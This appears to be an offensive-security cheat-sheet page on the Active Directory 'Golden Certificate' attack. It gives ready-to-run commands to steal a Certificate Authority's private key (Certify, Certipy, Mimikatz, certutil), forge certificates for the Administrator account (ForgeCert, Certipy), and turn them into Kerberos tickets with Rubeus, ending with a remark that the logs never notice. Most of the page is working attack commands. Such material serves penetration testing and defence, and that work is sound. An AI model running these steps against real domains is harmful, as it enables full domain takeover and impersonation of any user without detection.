---
title: 'Active Directory - Golden Certificate'
description: 'Active Directory - Golden Certificate.'
---
# Active Directory - Golden Certificate

Ah, the **Golden Certificate**. If a Golden Ticket is the master key to the castle, a Golden Certificate is the cryptographic forging machine that prints those master keys on demand. 

A Golden Certificate attack occurs when you successfully steal the Certificate Authority's (CA) private key. With this key in your possession, you can cryptographically forge valid authentication certificates for *any* user (including Domain Admins) without the CA or Domain Controllers ever knowing.

## 1. Stealing the Crown Jewels (CA Certificate & Private Key)

Before we start forging, we need the CA's private key. Depending on your current level of access and tools of choice, here are the ways to extract it.

### The Automated Way
If you have administrative access to the CA server, you can use these tools to dump the goods.

* **[Certify](https://github.com/GhostPack/Certify)** (The GhostPack classic):
    ```powershell
    Certify.exe manage-self --dump-certs
    ```

* **[Certipy](https://github.com/ly4k/Certipy)** (The Python powerhouse):
    ```bash
    certipy ca -u 'administrator@corp.local' -p 'Passw0rd!' -ns '10.10.10.10' -target 'CA.CORP.LOCAL' -config 'CA.CORP.LOCAL\CORP-CA' -backup
    ```

* **[Mimikatz](https://github.com/gentilkiwi/mimikatz)** (Because of course Mimikatz does this too):
    ```powershell
    mimikatz.exe "crypto::capi" "crypto::cng" "crypto::certificates /export"
    ```

### The GUI Way (Living off the Land)
If you prefer clicking things or are constrained to RDP:

* **Using `certsrv.msc`**:
    1. Open `certsrv.msc`
    2. Right-click the CA -> `All Tasks` -> `Back up CA...`
    3. Follow the wizard, and absolutely make sure you check the box for `Private key and CA certificate`. (Otherwise, you just backed up public data. Good job.)

* **Using `certlm.msc`**:
    1. Open `certlm.msc`
    2. Navigate to `Personal` -> `Certificates`
    3. Right-click the CA signing certificate -> `All Tasks` -> `Export`
    4. Select `Yes, export the private key`.

### The CLI Way
* **Using `certutil`**:
    ```powershell
    certutil -backupKey -f -p SuperSecurePassw0rd! C:\Windows\Tasks\CaBackupFolder
    ```

---

## 2. The Forgery Process

Now that you have the CA's private key (`.pfx` file), you are officially the captain. You can forge a certificate for any principal.

* **[Certify](https://github.com/GhostPack/Certify)**:
    ```powershell
    Certify.exe forge --ca-cert <pfx-path/base64-pfx> --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500
    ```

* **[ForgeCert](https://github.com/GhostPack/ForgeCert)**:
    ```powershell
    ForgeCert.exe --CaCertPath "ca.pfx" --CaCertPassword "Password" --Subject "CN=User" --SubjectAltName "administrator@domain.local" --NewCertPath "administrator.pfx" --NewCertPassword "Password"
    ```

* **[Certipy](https://github.com/ly4k/Certipy)**:
    ```bash
    certipy forge -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' -crl 'ldap:///'
    ```
    *Wait, what if they check extensions?* You can clone an existing template's extensions using `-template`:
    ```bash
    certipy forge -template 'attacker.pfx' -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
    ```

!!! tip
    **Pro-Tip on CRLs**: If you omit the `-crl` option when forging, authentication might fail. While the KDC doesn't typically perform an active CRL lookup during initial TGT issuance for performance reasons, it *does* check for the presence of a CDP extension. Its absence leads to a sad `KDC_ERROR_CLIENT_NOT_TRUSTED` error.

---

## 3. Cashing In (Requesting the TGT)

You have your forged, shiny certificate. Time to convert it into a Kerberos TGT.

* **[Rubeus](https://github.com/GhostPack/Rubeus)**:
    ```powershell
    Rubeus.exe asktgt /user:Administrator /domain:dumpster.fire /certificate:<pfx-path/base64-pfx>
    ```

* **[Certipy](https://github.com/ly4k/Certipy)**:
    ```bash
    certipy auth -pfx 'administrator_forged.pfx' -dc-ip '10.10.10.10'
    ```

Congratulations, you are now Domain Admin, and the logs have no idea how you enrolled for that certificate (because you didn't).
